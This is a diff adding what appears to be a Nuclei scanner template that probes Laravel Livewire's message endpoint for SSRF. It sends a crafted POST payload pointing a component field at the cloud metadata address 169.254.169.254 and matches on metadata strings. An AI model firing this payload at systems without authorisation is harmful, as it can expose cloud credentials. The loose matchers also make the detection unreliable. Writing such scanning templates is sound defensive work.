@@ -1,0 +1,45 @@
+id: livewire-ssrf-component-render
+
+info:
+  name: Livewire Component Render SSRF / Data Injection
+  author: pt-zenity
+  severity: high
+  description: |
+    Laravel Livewire's /livewire/message endpoint may be vulnerable to
+    data injection or SSRF when component data is not properly sanitized.
+    An attacker can manipulate component data to trigger server-side requests
+    or inject malicious data into component state.
+  reference:
+    - https://livewire.laravel.com/docs/security
+  classification:
+    cwe-id: CWE-20
+  tags: livewire,laravel,ssrf,injection
+
+http:
+  - raw:
+      - |
+        POST /livewire/message/livewire-component HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+        X-Livewire: true
+
+        {"fingerprint":{"id":"test","name":"livewire-component","locale":"en","path":"/","method":"GET","v":"acj"},"serverMemo":{"children":[],"errors":[],"htmlHash":"test","data":{},"dataMeta":[],"checksum":"test"},"updates":[{"type":"syncInput","payload":{"id":"test","name":"url","value":"http://169.254.169.254/latest/meta-data/"}}]}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"effects"'
+          - '"serverMemo"'
+          - '"fingerprint"'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "169.254.169.254"
+          - "ami-id"
+          - "instance-type"
+        condition: or
